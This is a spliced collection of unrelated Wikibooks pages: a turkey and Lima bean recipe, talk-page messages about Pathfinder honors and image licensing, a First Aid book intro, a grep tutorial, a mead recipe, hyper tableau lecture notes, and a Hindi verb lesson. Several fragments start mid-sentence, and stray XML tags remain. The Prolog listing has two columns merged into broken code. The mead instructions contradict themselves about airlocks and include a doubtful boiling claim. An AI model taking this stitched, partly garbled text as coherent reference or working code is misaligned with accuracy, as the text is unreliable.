'''Turkey and Lima beans''' is a simple dish with a rich flavour. The turkey mince, simmered in the same water used to cook the Lima beans, produces a flavoursome broth, and the sage really sets off the dish nicely. Great when served over [[Cookbook:Rice|steamed rice]].

==Ingredients==

* 500 [[Cookbook:Gram|g]] (1 [[Cookbook:Pound|lb]]) [[Cookbook:Turkey|turkey]] [[Cookbook:Mincing|mince]]
* 1 [[Cookbook:Cup|cup]] dried [[Cookbook:Lima Bean|Lima beans]]
* 1-2 [[Cookbook:Onion|onions]], sliced
* 2-3 sticks of [[Cookbook:Celery|celery]]
* a handful of fresh [[Cookbook:Sage|sage]], chopped (or 1-2 [[Cookbook:Teaspoon|tsp]] of dried sage)
* 2 tsp ground [[Cookbook:Coriander|coriander seed]]
* 1 tsp ground [[Cookbook:Cumin|cumin]]
* 1-2 tsp [[Cookbook:Chili Pepper|chili]] flakes or powder (or hot [[Cookbook:Paprika|paprika]])
* 2-3 [[Cookbook:Tablespoon|Tbs]] [[Cookbook:Olive Oil|olive oil]]
* [[Cookbook:Salt|salt]] and [[Cookbook:Pepper|pepper]], to taste
* [[Cookbook:Water|water]]

==Procedure==

# Soak the dried beans overnight, or at least 6 hours.
# Drain the soaked beans, discarding the water. Cover the beans with water in a small pot, bring to a boil, then reduce to a simmer. Stir periodically, and start testing for tenderness after 10 minutes. Alternatively, cook in a [[Cookbook:Pressure Cooking|pressure cooker]] at 15 PSI for 3 minutes, and set aside to depressurise.
# While the beans are cooking, add olive oil to a large pan and heat. When hot, add the onion and celery, and [[Cookbook:Sautéing|sauté]] until translucent.
# Add the cumin, coriander, chili, and pepper to the pan and stir in. Allow to sauté for another couple of minutes.
# Add the turkey mince to the pan, and turn up the heat. Stir while browning the mince, breaking up large pieces. Ensure that all the mince is browned.
# Tip the beans, with their cooking water, into the pan and stir in the salt and sage. Simmer for 15 minutes (e.g. while cooking some rice!)

Serve over steamed [[Cookbook:Rice|rice]] - it goes very nicely with arborio rice!

==Notes, tips and variations==
* Canned Lima beans may be used, to short-cut the preparation of this meal. Rinse well before use.
* Lima beans work wonderfully well with turkey or [[Cookbook:Chicken|chicken]], but other beans may be used instead if more convenient - I've found that [[Cookbook:Black-Eyed Pea|black-eyed peas]] are almost as good.
* If a thicker sauce is desired, stir in some [[Cookbook:Manioc Flour|manioc flour]], a tablespoon at a time until almost thick enough, while still hot. Alternatively, don't add all of the liquid from cooking the beans.

== Drilling and Marching ==

Hey Bjgadd,
[[Adventist Youth Honors Answer Book/Recreation/Drilling &amp; Marching|Drilling &amp; Marching]] looks fairly complete to me.  Are you ready to mark it as such?  Also, I added a note to the top declaring that Wikibooks is not the authority on D&amp;M for Pathfinders.  I just don't us to add &quot;see, Wikibooks says to do it this way&quot; to the ''The PF Drill Manual'' vs ''Army Field Manual'' argument.  Anyhow - if you think it's done, I'll be happy to announce it, update the progress icons, and add it to the front page. Nice job! --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 03:25, 8 April 2008 (UTC)

== Tents ==

Thanks! --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 03:37, 20 June 2008 (UTC)

== Welcome Back ==

Welcome back!

One of my Pathfinders was asking about Model Cars this summer, so this is a welcome addition.  Any reason you marked it as 75% rather an 100%?  Maybe we should add an automobile history section so that it makes a more self-contained reference. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 18:07, 26 July 2010 (UTC)</text>

      <text xml:space="preserve">This article needs LOTS of cleanup or internal links... It is designed for someone who already has a STRONG background in DNA, RNA, and other cell processes.  If anyone wants to try to understand this you will need to look up the following: protein synthesis (transcription, translation, elongation), DNA replication procedures and enzymes involved, meiosis.

: I agree.  I took the initial stab at writing up the answers, but quickly found that I was in over my head.  The honor itself is listed as skill level 3, meaning it is suitable for people over the age of 16.  But a you noted, the info as presented assumes a lot of background.  Ideally, the answer book entry should provide all the info needed to teach the honor, and as it is, it provides only enough to get a superficial understanding of the material. --[[User:Jomegat|Jomegat]] 01:17, 24 June 2007 (UTC)</text>

I see you have lots of first aid content here. Some of it is out-of-date, and some doesn't fall under the normal definition of Standard First Aid (although you may be using a different definition). Nevertheless, if you'd like to help with the [[First Aid]] book, we'd be happy to have you contribute. If you want to update the content on this page, you're welcome to take content from the wikibook, or [[User talk:Mike.lifeguard|ask specific questions]].

: The requirements for the AY honors are set by various committees around the world, and we do not have the latitude to change them.  Most of the answers given here were taken from a handful of U.S Navy Training Manuals.  I do not mind ''at all'' if the answers are updated, or even if the requirements are questioned in the answers themselves.  --[[User:Jomegat|Jomegat]] 02:05, 24 June 2007 (UTC)</text>

{{collection}} __NOTOC__
{{Reading level|Intermediate}}

This book covers in depth all topics required for a standard first aid course, and also includes a section on advanced topics. The basics covered include:
*Primary assessment and [http://en.wikipedia.org/wiki/Cardiopulmonary_resuscitation CPR]
*Legal aspects of first aid, including negligence and consent
*Circulatory emergencies, such as bleeding, heart attack and stroke
*Respiratory emergencies, such as asthma and anaphylactic shock
*Internal injuries, such as broken bones, chest injuries, and internal bleeding
*Burns, seizures and other medical conditions

In the chapter on [[First Aid/Advanced Topics|advanced topics]], you'll find information about oxygen administration and airway management; AED operation and wilderness techniques; additional assessments and triage.

The intended audience is taking a first aid course from a certified instructor, and can read at a high school level. Please be advised that there are some images of the injuries and conditions discussed.

This is a [[w:wiki|wiki]], so ''you can edit this book''; and if you find a mistake, then please '''[[WB:BOLD|be bold]]''' and fix it. If you want to leave comments, please do so on the talk page for that module. If you want to help out even more, take a look through [[First Aid/What needs to be done?|What needs to be done?]] for tasks that still need to be done, or start with whatever tasks you stumble across.

If they arent, they should be removed. They get a lot of the attention there and can potentially confuse a lot of users.--[[User:189.144.36.202|189.144.36.202]] 07:51, 24 June 2007 (UTC)

Regarding laser scanners, they are much faster, more reliable and will read a barcode on any angle. They also have less problems with condensation on the barcode as is often the case with refrigerated products in humid climates.

Can OpenBravo drive serial cash drawers? (not connected via printer)

      <text xml:space="preserve">'''Grep''' is a Unix utility that searches through either information piped to it or files in the current directory. An example should help clarify things.

Let's say that we wanted to search through a directory, and wanted to find all the files that had the string &quot;hello&quot; in their name. You might issue the 'ls' command in a shell to list the directory's content and:
&lt;source lang=&quot;bash&quot;&gt;
$ ls
DumpSite.sh  crontab.txt  nagios-3.0.6  xmpppy  xymon-4.3.0-beta2
&lt;/source&gt;
and look through everything manually, or you could use the 'ls' command and pipe the output of ls to grep:
&lt;source lang=&quot;bash&quot;&gt;
$ ls |grep crontab
crontab.txt
&lt;/source&gt;
On the contrary, if you want to filter a list unless some entries, put it in the parameter -v:
&lt;source lang=&quot;bash&quot;&gt;
$ ls |grep -v crontab
DumpSite.sh
nagios-3.0.6
xmpppy
xymon-4.3.0-beta2
&lt;/source&gt;
the '|' character is the representation of the pipe basically directs the output of the 'ls' command as input for grep. You should get a nice (perhaps empty) list with all the files that have &quot;hello&quot; in their names. 

For search term, grep can take regular expressions rather than plain strings. A simple example for that might be looking for all .txt OR .jpg files in a directory : 
&lt;source lang=&quot;bash&quot;&gt;
$ ls | grep '.*\(txt\|jpg\)'
&lt;/source&gt;
The regex here is made up from .* which can stand for anything in a file's name and \(txt\|jpg\) which yields either txt or jpg as file endings.

==Options==
Command-line options aka switches of grep:
* -e pattern
* -i: Ignore uppercase vs. lowercase.
* -v: Invert match.
* -c: Output count of matching lines only.
* -l: Output matching files only.
* -n: Precede each matching line with a line number.
* -b: A historical curiosity: precede each matching line with a block number.
* -h: Output matching lines without preceding them by file names.
* -s: Output status only.
* -x
* -f file: Take regexes from a file.

Command-line options aka switches of GNU grep, beyond the bare-bones grep:
* --help
* -V, --version
* --regexp=pattern, in addition to -e pattern
* --invert-match, in addition to -v
* --word-regexp, in addition to -w
* --line-regexp, in addition to -x
* -A num, --after-context=num
* -B num, --before-context=num
* -C num, -num, --context=num
* and more ...

==Regular expressions==
Grep uses a particular version of regular expressions different from sed and Perl. Grep covers POSIX basic regular expressions (see also [[Regular Expressions/Posix Basic Regular Expressions]]).

Regular expression features available in grep include *, ., ^, $, [ ], [^ ], \( \), \n, \{i\}, \{i,j\}, \{i,\}.

Regular expression features available in GNU grep as a GNU extension include \?, \+, \b, \B, \&lt;, \&gt;, \w, \W, \s, \S.

Regular expression features available in grep with -E switch include ?, +, |, ( ), {i}, {i,j}, {i,}.

Predefined character classes supported by grep include [:alpha:], [:blank:], [:cntrl:], [:digit:], [:graph:], [:lower:], [:print:], [:punct:], [:space:], [:upper:], and [:xdigit:].

Regular expression features unavailable in grep include Perl's \d, \D, \A and \Z.

* [http://www.gnu.org/software/grep/manual/grep.html#Regular-Expressions Regular Expressions] in GNU grep manual, gnu.org

==Examples==
Examples of grep use:
* echo file.txt | grep &quot;.*\(txt\|doc\)&quot;
** Matches. &quot;\(&quot; and &quot;\)&quot; create a group, while &quot;\|&quot; separates items in the group. The group matches if at least one of its items matches.
* echo a456 | grep &quot;[a-zA-Z][0-9][0-9]*&quot;
** Matches. &quot;[&quot; and &quot;]&quot; are delimiters for character groups. &quot;*&quot; stands for zero, one, or any other number of the previous.
* echo a456 | grep -i &quot;[A-Z][0-9]\+&quot;
** Matches. &quot;\+&quot; stands for one or more occurrences of the previous. Unlike &quot;*&quot;, &quot;+&quot; has to be preceded by &quot;\&quot;. &quot;-i&quot; makes the search case-insensitive.
* echo file.txt | grep -E &quot;.*(txt|doc)&quot;
** Matches. &quot;-E&quot; stands for extended regular expressions. In extended regex, &quot;(&quot; and &quot;|&quot; do not need &quot;\&quot; to act as special characters; they need &quot;\&quot; to act as literals, that is, stand for themselves.
* echo abbc | grep -E &quot;abb?c&quot;
** In extended regular expressions enabled by -E switch, the question mark matches zero or one occurrences of the previous.
* echo abbc | grep &quot;abb\?c&quot;
** In GNU Grep, \? (question mark preceded by a backslash) matches zero or one occurrences of the previous.
* echo a4c | grep -P &quot;a\dc&quot;
** In GNU Grep of some versions, matches. &quot;-P&quot; stands for Perl regular expresions; &quot;\d&quot; in the regex stands for a digit.
* grep -P &quot;\x22hello\x22&quot; file.txt
** In GNU Grep of some versions, searches for the string starting with a quotation mark, followed with &quot;hello&quot;, followed with another quotation mark. Makes use of &quot;-P&quot;, which turns on Perl regex. In Perl regex, &quot;\x22&quot; stands for a quotation mark, via standing for the character with the hexadecimal ASCII value of 22.
* grep -P &quot;a\t+b&quot; file.txt
** In GNU Grep of some versions, refers to the tab character (tabulator) by &quot;\t&quot;. Enabled by -P.
* grep -Fxv -f file2.txt file1.txt
** Outputs set difference: file1.txt - file2.txt. Uses -F to interpret search term literally aka non-regex, -x to match whole lines only, -v to invert match, and -f to take the search terms from a file.
* grep -Fx -f file1.txt file2.txt
** Outputs set intersection: those lines of file1.txt that are also in file2.txt.
* perl -ne &quot;print if /\x22hello\x22/&quot; file.txt
** Not really a grep example but a Perl oneliner that you can use if Perl is available and grep is not.

==Versions==
Old versions of GNU grep can be obtained from [ftp://ftp.gnu.org/gnu/grep/ GNU ftp server].

Release announcements of GNU grep are at a [http://savannah.gnu.org/news/?group_id=67 savannah group].

A changelog of GNU grep is available from [http://git.savannah.gnu.org/cgit/grep.git/tree/NEWS git.savannah.gnu.org].

A version of GNU grep for MS Windows is available from [http://gnuwin32.sourceforge.net/packages/grep.htm GnuWin32 project], as well as from [http://www.cygwin.com/ Cygwin].

==Image copyright problem with [[:Image:Fiberlc.jpg]]==
 
Thanks for uploading [[:Image:Fiberlc.jpg]]. The [[w:Wikimedia Foundation|Wikimedia Foundation]] is very careful about the images included in Wikibooks because of [[w:United States copyright law|copyright law]], and requires that we maintain a strict [[Wikibooks:Copyright|copyright policy]]. The image that may soon be deleted unless we can determine the copyright holder and status. 

The copyright holder is usually the creator, the creator's employer, or the last person who was transferred ownership rights. Copyright information on images is signified using copyright templates. The three basic license types on Wikibooks are [[w:open content|open content]], [[w:public domain|public domain]], and [[w:fair use|fair use]]. Find the appropriate template in [[Wikibooks:Image copyright tags]] and place it on the image page like this: &lt;code&gt;{&amp;#123;TemplateName}}&lt;/code&gt;.

Please signify the copyright information on any other images you have uploaded or will upload. Remember that images without this important information or giving false information can be deleted by an administrator.

== Help ==

Well I actually thought you were doing a pretty good job!!  You realised the mistake with the preface page and fixed it (I deleted the one you blanked).  If you find something that is speedily deletable (and something you create but no longer want comes under that heading) then the template is {{tl|delete}} (Take a look at [[Wikibooks:Template messages/Deletion]] for more detail and some others.  For other queries take a look at the links in the &quot;Welcome&quot; - they are pretty helpful.  If you don'y find what you want there then posting [[Wikibooks:Staff lounge/New|here]] looks to be a good idea.  It should mean whoever is around will respond.

== Images ==

===Mosquito===
G'day Agricola, [[:Image:Mosquito.png]] that you recently uploaded to Wikibooks already existed on the Wiki Commons as [[:Image:AnophelesGambiaemosquito.jpg]]. In general, it is better to source your images from Commons whenever possible. Also, unless there is a good reason otherwise (such as Fair Use), it is best to upload new images to Commons too - this makes them available to other projects such as non-English Wikibooks.

I've replaced the mosquito image on [[Lingua Franca Nova/21]] with the Commons copy, and tagged the image you uploaded as {{tl|NowCommons}}. cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 14:29, 25 June 2007 (UTC)

===Bird-fly===
G'day again, [[:Image:Bird-fly.jpg]] is stated to be from http://lfn.esef.net/index.php/Capitol_Dudes-un_-_Animales, but that page actually sources the image from http://webspace.ship.edu/cgboer/bird-fly.jpg which is an external site to the wiki. I can't see anything about licensing on that website, although the user (cgboer) apparently has some relationship with the wiki you specify as the image source. Could you please follow up and determine what the real licensing situation is? thanks, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 14:46, 25 June 2007 (UTC)

:Thank you! I didn't know how to use wikicommons images on wikibooks - I see that it is obvious!  Regarding the bird-fly.jpg image, cgboer is the founder of the website, so I assume that since the website is GNU, the jpg is also.  Is that sufficient? [[User:Agricola|Agricola]]

::No worries, I was stumped first time I tried to use a Commons image. Regarding bird-fly.jpg, please ask Mr. Boeree to state explicitly on the webspace website somewhere that this image is GFDL. I have no doubt that he intends it to be so, but Wikibooks needs a clear statement. cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 15:26, 25 June 2007 (UTC)

:::Done. Thanks, mate! [[User:Agricola|Agricola]]

:G'day, how is this going? Have you heard back from Mr. Boeree? [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 02:30, 13 July 2007 (UTC)

I saw the lafamilia.png picture on the Lingua Franca Nova wikibook. Check out the pictures used on such pages as [[Spanish/Vocabulary/People]] and [[German/Appendices/Vocabulary/People]]. You may want to work this into a lesson! [[User:Cilantrohead|Cilantrohead]] ([[User talk:Cilantrohead|talk]]) 04:36, 2 March 2008 (UTC)

== LFNcasa.jpg ==

Hi Agricola,

I'm learning LFN and I'm reading the LFN wikibook.  Thanks for your image LFNcasa.jpg, but I think I've found a mistake.  Shouldn't &quot;porta&quot; be &quot;porte&quot;?  According to the LFN-English dictionary, &quot;porta&quot; is the verb meaning &quot;to carry&quot;.  Would there be any way you could update the diagram if there is a mistake?  Thanks!

      <text xml:space="preserve">===Starter mead recipe:===

====Ingredients====
3 pounds of honey per gallon (U.S.). (For example, 15 pounds of honey are used with a 5 gallon (U.S.) carboy.) 1 pound of raisins.(optional) 1 packet of dry winemaker's yeast EC1118 or similar as well as yeast nutrient.

Some vintners prefer to create a starter culture by preparing a mixture of one cup of room temperature sanitized fruit juice and the freeze dried winemaking yeast and placing it into a smaller one quart sanitized container fitted with a rubber stopper and airlock for a day or two until the mixture is bubbling. This container is kept at room temperature out of direct sunlight. This starter culture will cause the fermentation below to begin with vigor and may prevent the mead from failing to ferment.

====Preparing the liquid====
Honey is slowly added to a large pot half-full with water while heating. There is a common disagreement among mead makers as to whether you should boil the honey or not; mead makers have had success with either method. Boiling will alter the flavor, but will enhance the clarity of the finished mead. As the mead is heated over medium heat, it will just start to boil after the impurities have been cleared, as pure liquids boil at a lower temperature.

====Fermenting====
After a time of heating the honey (which helps it dissolve and can also pasteurize it), the mixture is cooled to between (170°F/76°C) and (140°F/60°C) and the raisins are added. The mixture continues to cool, then is transferred to the carboy. Once it has cooled to room temperature (68°F/20°C), yeast which has been rehydrated is added to the honey/water mixture (must) and the airlock is put on. After being placed in a cool (68°F/20°C), dark place for a few hours or a day, the airlock should start to allow bubbles to escape. This is waste carbon dioxide (CO2) and shows that the yeast is processing the sugar into alcohol. The raisins rise to the surface of the fermenting mixture. If they block the airlock, the mead maker will have to rack. Stirring or agitating the mixture is avoided, as it may cause the liquid to rise up and spill out of the airlock.

====Racking====
After a two to three week period the mead maker may want to rack the mead into a second sanitized carboy. An airlock is not necessary during primary (aerobic) fermentation. This racking will clear out the lees and allow the mead to clear faster. The mead is siphoned into the second carboy via a sanitized tube, usually filled it with sterile water to start the siphon. The mead is siphoned carefully to avoid splashing as excess oxygen at this point may cause an unpleasant taste in the final product. An airlock is placed on the second carboy. It is imperative that sterile conditions be maintained while the carboys are open to avoid infection. The mead is racked every two weeks until all signs of fermentation have stopped (usually when the airlock doesn't produce any bubbles for a long period of time—typically over 30 seconds between bubbles) and your mead has cleared. The carboy is clear enough when it is possible to read a newspaper through it.

====Bottling====
Then next step is to bottle the mead. Mead is generally sealed in sanitized bottles using airtight caps or quality corks. If the fermentation is not complete, pressure will build up inside the sealed bottles and cause them to explode. Mead is generally aged for at least 6 months in the bottle before drinking.

====Variations====
In addition to the basic mead recipe, it is possible to enrich the flavour by adding spices, or using different sorts of honey. Some honeys can actually have a far less sweet flavour, although they still ferment just as well, and honeycomb can also be added so long as it is filtered out at the end of fermentation.

generation, i.e. a  bottom-up proof procedure. The prover was given by a small Prolog-program, which implements a tableau proof procedure. One restriction is that it requires range restricted formulae.

==Definition 30==
A first order  clause &lt;math&gt;A_1 \lor \cdots \lor  A_n \gets B_1 \land \cdots \land B_m&lt;/math&gt; is called ''range restricted'' if every variable which occurs in the head &lt;math&gt;A_1 \lor \cdots \lor  A_n&lt;/math&gt; occurs in the body &lt;math&gt;B_1 \land \cdots \land B_m&lt;/math&gt; as well.

#Convert clauses to range restricted form: &lt;br&gt;&lt;center&gt;&lt;math&gt; q(x) \lor    p(x,y) \gets   q(x) \qquad \rightsquigarrow \qquad q(X) ; p(X,Y) &lt;- q(X), dom(Y)&lt;/math&gt;&lt;/center&gt;
#assert range-restricted clauses and dom clauses in Prolog database. 
# Call satisfiable: 

 kill satisfiable :-    assume(X) :- asserta(X).     
        (Head &lt;- Body)            assume(X) :-  
        Body, not Head, !,          retract(X), !, fail.  
        component(HLit, Head),      component(E, (E ; _)).      
        assume(HLit),               component(E, (_ ; R)) :-    
        not false,                   !, component(E, R).   
        satisfiable.                component(E, E).  
   satisfiable.

First-Order completeness via Level-Saturation modification.
This proof procedure implements Hyper Tableaux in the ground case.

==Hyper Tableau - Ground Case==
&lt;center&gt;[[Image:hypertableau.png]]&lt;/center&gt;

All open branches consist of positive literals only
Take the following clause set as an example
&lt;math&gt;\{  \to  A, \quad    \to  B, \quad
A\land B \to  C\lor D,\quad
A\land B \to  E\lor D,\quad
A\land C \to \}&lt;/math&gt;
&lt;center&gt;

==Definition 31 (Literal tree, Clausal Tableau)==
A ''literal tree'' is a pair &lt;math&gt;(t,\lambda)&lt;/math&gt; consisting of a finite, ordered tree &lt;math&gt;t&lt;/math&gt; and a labeling function &lt;math&gt;\lambda&lt;/math&gt; that assigns
a literal to every  non-root node of &lt;math&gt;t&lt;/math&gt;.
  
The ''successor sequence'' of a node &lt;math&gt;N&lt;/math&gt; in an ordered tree &lt;math&gt;t&lt;/math&gt; is the sequence of nodes with immediate predecessor &lt;math&gt;N&lt;/math&gt;, in the order given by &lt;math&gt;t&lt;/math&gt;.

A ''(clausal) tableau'' &lt;math&gt;T&lt;/math&gt; of a set of clauses &lt;math&gt;\mathcal{S}&lt;/math&gt; is a literal
tree &lt;math&gt;(t,\lambda)&lt;/math&gt; in which, for every successor sequence &lt;math&gt;N_1,\dots,N_n&lt;/math&gt; in &lt;math&gt;t&lt;/math&gt; labeled with literals &lt;math&gt;K_1,\dots,K_n&lt;/math&gt;,
respectively, there is a substitution &lt;math&gt;\sigma&lt;/math&gt; and a clause &lt;math&gt;\{L_1,\dots,L_n\} \in \mathcal{S}&lt;/math&gt; with &lt;math&gt;K_i = L_i\sigma&lt;/math&gt; for every &lt;math&gt;1 \leq i \leq n&lt;/math&gt;.  &lt;math&gt;\{K_1,\dots,K_n\}&lt;/math&gt; is called a ''tableau clause'' and
the elements of a tableau clause are called ''tableau literals''.

==Definition 32 (Branch, Open and Closed Tableau, Selection Function)==
A ''branch'' of a tableau &lt;math&gt;T&lt;/math&gt; is a sequence  &lt;math&gt;N_0,\ldots , N_n&lt;/math&gt; (&lt;math&gt;n \geq 0&lt;/math&gt;) of nodes in &lt;math&gt;T&lt;/math&gt; such that &lt;math&gt;N_0&lt;/math&gt; is the root of &lt;math&gt;T&lt;/math&gt;, &lt;math&gt;N_i&lt;/math&gt; is the immediate predecessor of &lt;math&gt;N_{i+1}&lt;/math&gt; for &lt;math&gt;0 \leq i &lt; n&lt;/math&gt;, and &lt;math&gt;N_n&lt;/math&gt; is a leaf of &lt;math&gt;T&lt;/math&gt;. We say branch &lt;math&gt;b= N_0,\ldots , N_n&lt;/math&gt; is a ''prefix'' of branch &lt;math&gt;c&lt;/math&gt;, written as &lt;math&gt;b \leq  c&lt;/math&gt; or &lt;math&gt;c \geq  b&lt;/math&gt;, iff &lt;math&gt;c = N_0,\ldots , N_n, N_{n+1},\ldots , N_{n+k}&lt;/math&gt; for some nodes &lt;math&gt;N_{n+1},\ldots ,  N_{n+k}&lt;/math&gt;, &lt;math&gt;k\geq 0&lt;/math&gt;.
The ''branch literals'' of branch &lt;math&gt;b = N_0,\ldots , N_n&lt;/math&gt; are the set &lt;math&gt;lit(b) = \{ \lambda (N_1),\ldots \lambda (N_n)\} &lt;/math&gt;.
We find it convenient to use a branch in place where a literal set is required, and mean its branch literals. For instance, we will
write expressions like &lt;math&gt;A \in  b&lt;/math&gt; instead of &lt;math&gt;A \in  lit(b) &lt;/math&gt;.

In order to memorize the fact that a branch contains a contradiction, we allow to label a branch as either ''open'' or ''em closed''.
A tableau is ''closed'' if each of its branches is closed, otherwise it is ''open''.

A ''selection function'' is a total function &lt;math&gt;f&lt;/math&gt; which maps an open tableau to
one of its open branches. If &lt;math&gt;f(T) = b&lt;/math&gt; we also say that ''&lt;math&gt;b&lt;/math&gt; is
selected in &lt;math&gt;T&lt;/math&gt; by &lt;math&gt;f&lt;/math&gt;''.

Note that branches are always finite, as tableaux are finite.
Fortunately, there is no restriction on which selection function to
use. For instance, one can use a selection function which always
selects the &quot;leftmost&quot; branch.
==Definition 33 (Hyper Tableau - Ground Case)==


Let &lt;math&gt;S&lt;/math&gt; be a finite set of  clauses and &lt;math&gt;f&lt;/math&gt; be a
selection function. ''Hyper tableaux'' for &lt;math&gt;S&lt;/math&gt; are inductively defined  as follows:&lt;br&gt;
'''Initialization step:'''
A one node literal tree is a hyper tableau for &lt;math&gt;S&lt;/math&gt;. Its single branch is marked as &quot;open&quot;.

'''Hyper extension step:'''  If
      
#  &lt;math&gt;T&lt;/math&gt; is an open hyper tableau for &lt;math&gt;S&lt;/math&gt;, &lt;math&gt;f(T) = b&lt;/math&gt; (i.e. &lt;math&gt;b&lt;/math&gt; is selected in &lt;math&gt;T&lt;/math&gt; by &lt;math&gt;f&lt;/math&gt;) with open leaf   node &lt;math&gt;N&lt;/math&gt;, and 
# &lt;math&gt;C = A_1, \ldots , A_m \gets  B_1, \ldots , B_n&lt;/math&gt; is a clause from &lt;math&gt;S&lt;/math&gt; (&lt;math&gt;m \geq 0&lt;/math&gt;, &lt;math&gt;n\geq 0&lt;/math&gt;),   called ''extending clause'' in this context, and   
# such that  &lt;math&gt;\{  B_1, \ldots , B_n\} \subseteq b&lt;/math&gt; (referred to as ''hyper condition'') &lt;br&gt;
then the literal tree &lt;math&gt;T'&lt;/math&gt; is a hyper tableau for &lt;math&gt;S&lt;/math&gt;, where &lt;math&gt;T'&lt;/math&gt; is
obtained from &lt;math&gt;T&lt;/math&gt; by attaching &lt;math&gt;m+n&lt;/math&gt; child nodes
&lt;math&gt;M_1,\ldots ,M_m,N_{1},\ldots ,N_{n}&lt;/math&gt; to &lt;math&gt;b&lt;/math&gt; with respective labels
&lt;br&gt;&lt;center&gt;&lt;math&gt;
A_1,\ldots , A_m ,\lnot B_1, \ldots , \lnot B_n 
&lt;/math&gt;&lt;/center&gt;&lt;br&gt;
and marking every  new branch &lt;math&gt;(b,M_1),\ldots ,(b,M_m)&lt;/math&gt; with positive leaf as &quot;open&quot;, and marking every new branch   &lt;math&gt;(b,N_{1}),\ldots ,(b,N_{n})&lt;/math&gt; with negative leaf
as  &quot;closed&quot;.
==Minimal Model Reasoning==
The clause set &lt;math&gt;M = \{ A \lor B  \gets, \quad  B  \gets A \} &lt;/math&gt; obviously has two different
models: &lt;math&gt; \{ A,\;B \}&lt;/math&gt; and &lt;math&gt;\{ B \}&lt;/math&gt;. Under set inclusion these models can
be compared and there are some tasks where it is appropriate to compute the (or
in general ''a'') smallest one.  This is for example the case with
  
*Knowledge Representation, Circumscription 
*Basis for default negation (GCWA) 
*Applications: Deductive database updates, Diagnosis 
There are basically two different methods  to compute minimal models.

===Minimal Model Reasoning – Niemel¨a’s Approach===
Given a set of ground clauses &lt;math&gt;M&lt;/math&gt; the methods applies a model generating
procedure, e.g. hyper tableau, which is able to generate all models.

''Lemma 1:'' For every minimal model &lt;math&gt;p&lt;/math&gt; for &lt;math&gt;M&lt;/math&gt; there is a branch
with literals &lt;math&gt;p&lt;/math&gt;.

Assume that &lt;math&gt;\Sigma&lt;/math&gt; is the set of atoms, which occur in the head of a clause from
&lt;math&gt;M&lt;/math&gt;, than the following Lemma holds.

''Lemma 2:'' &lt;math&gt;p&lt;/math&gt; is a minimal model for &lt;math&gt;M&lt;/math&gt; iff &lt;math&gt;M \cup \{ \lnot A\mid A \in \Sigma\setminus p\} \models p&lt;/math&gt;

This offers a general method:  Generate model candidates, and test with Lemma
2. 

&lt;math&gt;p =\{A,\; B\}&lt;/math&gt; is not a minimal model in our example from above, because 
&lt;math&gt;M \cup \{\} \models  \{A,\; B\}&lt;/math&gt;  iff  &lt;math&gt;M \cup \{   \gets A\land B \}&lt;/math&gt; is
unsatisfiable, which is not the case, hence &lt;math&gt;p&lt;/math&gt; does not correspond to a
minimal model and hence the branch is closed.

&lt;math&gt;p = \{B\}&lt;/math&gt; is minimal because 
&lt;math&gt;M \cup \{  \gets A \} \models \{B\} &lt;/math&gt;  iff &lt;math&gt;M \cup \{ {} \gets A \} \cup \{ {} \gets B   \}&lt;/math&gt; is unsatisfiable. This is the case
and hence &lt;math&gt;p&lt;/math&gt; is minimal and the branch  remains open.

''Properties:'' Soundness (by Lemma 2) Completeness (by Lemma 1), ''space efficiency''.

===Minimal Model Reasoning – Bry&amp; Yayha‘s Approach===

As an example we have the set &lt;math&gt;M = \{ A \lor B \lor C  \gets, \quad B  \gets A, \quad  D  \gets B\}&lt;/math&gt;

&lt;center&gt;[[Image:minimalmodelreasoning.png]]&lt;/center&gt;


''Lemma:'' With complement splitting, the leftmost open branch
is a minimal model for &lt;math&gt;M&lt;/math&gt;.

''General method:'' Repeat: generate minimal model &lt;math&gt;p&lt;/math&gt;, add &lt;math&gt;{} \gets
p&lt;/math&gt; to &lt;math&gt;M&lt;/math&gt;.
''Properties:'' Soundness (by Lemma) Completeness as before,
possibly exponentially many new clauses &lt;math&gt;{} \gets p&lt;/math&gt;.

{{Indic}}
==क्रिया (Verb)==

In Hindi verbs are inflected basing upon gender, person, number, tense, mood, and aspect. There are three tenses – past, present and future (some linguists include the subjunctive mood in the tenses); three moods - imperative, indicative, and subjective; two aspects: imperfective and perfective. In sentence structuring the verb always comes at the end. 
 
The verb होना which is equivalent of 'be' is used as a copula in simple predicative sentences and as an auxiliary in different types of verbal constructions (just as in English). The verb  होना has four sets of verbal forms: present, past, presumptive, and subjunctive. It is one of the most important verbs, and a learner has to learn its different inflected forms before progressing any further for the sake of avoiding confusion.

a)Present (corresponds to the verb 'be')

|}    

Verb forms

The lexical form of Hindi verbs I.e – the infinitive form found in dictionaries is always in the form of verb stem+ना. For example to sleep = सोना, to eat = खाना, to cook = पकाना. To form other forms we remove ना and add the required suffix (which depends upon tense as well as person). For example 'will sleep' (3rd person sing.) = सोना-ना+एगा=सोएगा.

Let us just have a basic idea of how to make and use verbs in present tense. We'd learn more about the modification of verbs basing upon tense and aspect in the lesson on tenses. 

To form verbs for describing an action that regularly goes on (the present imperfect), add ता/ते to the verb stem. Example : लिख+ता+=लिखता/ते. Remember that लिखते is used for plural nouns/pronouns (and the 2nd person singular in honorary form I.e-for आप). So we can say मैं लिखता हूँ (I write), वो किताबें लिखते हैं (They write books) etc. 

For changing verb to show present continuous for describing a current ongoing action, add रहा हुँ (1st person sing), रहा है (2nd person sing. intimate,3rd person sing.),  रहे हो (2nd person plural intimate) or रहे हैं (all rest plural and 2nd person sing honorary) has to be added to verb stem. So we can have मैं लिख रहा हूँ (I'm writing), वे लिख रहे हैं (They are writing) and so on.

Another point to be noted is that these are all masculine forms. For agreement with a feminine noun/pronoun the last 'आ/ए’ mātrā must be replaced by the mātrā 'ई’. Examples : गीता जाती है (Geeta goes), वो लिखती है (She writes), हम जा रही हैं (We are going) etc.
VERB in short related to just two words simply -&gt; 1. TO BEING ( hona )   , 2. TO DO ( karna )

